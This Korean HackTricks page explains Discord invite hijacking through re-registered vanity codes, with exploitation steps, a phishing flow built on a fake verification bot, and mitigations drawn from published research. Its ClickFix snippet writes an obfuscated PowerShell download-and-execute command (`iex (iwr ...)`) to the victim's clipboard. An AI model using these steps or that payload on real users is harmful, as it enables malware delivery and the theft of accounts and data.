# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord의 초대 시스템 취약점을 통해 threat actor는 만료되거나 삭제된 초대 코드(temporary, permanent 또는 custom vanity)를 Level 3 Boost를 보유한 모든 서버에서 새로운 vanity 링크로 선점할 수 있습니다. 모든 코드를 소문자로 정규화하면, 공격자는 알려진 초대 코드를 미리 등록하고 원래 링크가 만료되거나 원본 서버가 Boost를 잃는 즉시 트래픽을 조용히 hijack할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 만료 후 코드가 다시 사용 가능해지며, Boost를 보유한 서버가 vanity URL로 재등록할 수 있습니다. |
| Permanent Invite Link | ⚠️          | 삭제되었고 소문자와 숫자로만 구성된 경우 코드가 다시 사용 가능해질 수 있습니다.        |
| Custom Vanity Link    | ✅          | 원본 서버가 Level 3 Boost를 잃으면 vanity invite가 새로 등록할 수 있는 상태가 됩니다.    |

## Exploitation Steps

1. Reconnaissance
- `discord.gg/{code}` 또는 `discord.com/invite/{code}` 패턴과 일치하는 invite links를 public sources(forum, social media, Telegram channels)에서 모니터링합니다.<sup>[[1]](#references)</sup>
- 관심 있는 invite codes(temporary 또는 vanity)를 수집합니다.
2. Pre-registration
- Level 3 Boost privileges가 있는 Discord server를 생성하거나 기존 서버를 사용합니다.
- **Server Settings → Vanity URL**에서 target invite code를 할당합니다. 승인되면 해당 코드는 malicious server가 예약하게 됩니다.
3. Hijack Activation
- temporary invites의 경우 원본 invite가 만료될 때까지 기다립니다(또는 source를 제어하고 있다면 수동으로 삭제합니다).
- uppercase가 포함된 codes의 경우 lowercase variant를 즉시 claim할 수 있지만, redirection은 만료 후에만 활성화됩니다.
4. Silent Redirection
- hijack이 활성화되면 기존 링크에 접속하는 사용자는 공격자가 제어하는 server로 seamless하게 전송됩니다.

## Phishing Flow via Discord Server

1. **#verify** channel만 표시되도록 server channels를 제한합니다.<sup>[[1]](#references)</sup>
2. bot(예: **Safeguard#0786**)을 배포하여 newcomers에게 OAuth2를 통해 verify하도록 안내합니다.
3. bot이 CAPTCHA 또는 verification 단계로 위장한 phishing site(예: `captchaguard.me`)로 사용자를 redirect합니다.
4. **ClickFix** UX trick을 구현합니다:
- broken CAPTCHA message를 표시합니다.
- 사용자에게 **Win+R** dialog를 열고, 미리 로드된 PowerShell command를 붙여 넣은 다음 Enter를 누르도록 안내합니다.

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
이 접근 방식은 직접적인 파일 다운로드를 피하고 익숙한 UI 요소를 활용하여 사용자의 의심을 낮춥니다.<sup>[[1]](#references)</sup>

## Mitigations

- 하나 이상의 대문자 또는 영숫자가 아닌 문자를 포함하는 영구 invite links를 사용합니다(만료되지 않으며 재사용할 수 없음).<sup>[[1]](#references)</sup>
- invite codes를 정기적으로 교체하고 이전 links를 revoke합니다.
- Discord server boost status와 vanity URL claims를 모니터링합니다.
- 사용자가 server의 진위성을 확인하고 clipboard-pasted commands를 실행하지 않도록 교육합니다.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
